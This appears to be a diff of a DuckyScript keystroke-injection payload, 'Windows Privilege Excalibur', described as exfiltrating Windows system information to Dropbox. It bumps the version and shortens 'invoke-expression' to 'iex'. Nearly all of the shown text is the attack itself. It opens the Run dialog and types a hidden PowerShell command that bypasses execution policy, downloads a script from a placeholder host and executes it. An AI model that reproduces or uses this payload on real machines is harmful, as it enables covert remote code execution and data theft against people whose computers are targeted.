@@ -2,7 +2,7 @@ REM Title: Windows Privilege Excalibur
 REM Author: PlumpyTurkey (formerly Who-Is-Julien)
 REM Description: This payload exfiltrates Windows system information and installed programs from the target computer to DropBox cloud storage for subsequent privilege escalation analysis.
 REM Target: Windows 10, 11
-REM Version: 1.0.1
+REM Version: 1.1
 REM Category: Exfiltration
 
 DEFINE DOWNLOAD_LINK example.com
@@ -12,6 +12,6 @@ GUI r
 DELAY 500
 STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr 
 STRING DOWNLOAD_LINK
-STRING ; invoke-expression $pl
+STRING ; iex $pl
 DELAY 500
 ENTER
